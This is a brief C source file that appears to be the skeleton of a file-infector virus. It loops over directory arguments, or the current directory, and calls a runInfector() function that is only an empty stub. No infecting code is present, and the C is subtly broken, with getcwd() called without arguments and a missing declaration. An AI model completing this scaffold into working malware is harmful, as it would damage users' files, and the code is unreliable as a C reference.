#include <string.h>

typedef struct s_String {
  char* ptr;
  size_t length;
} String;

int main(int ac, char** args) {
  // I miss foreach :(
  String dir;
  for (int i = 1; i < ac; ++i) {
    dir.ptr = args[i];
    dir.length = strlen(args[i]);
    if (!runInfector(&dir))
      return 1;
  }
  if (ac < 2) {
    dir.ptr = getcwd();
    dir.length = strlen(dir.ptr);
    return runInfector(&dir);
  }
  return 0;
}

int runInfector(String* directory) {
  return 0;
}
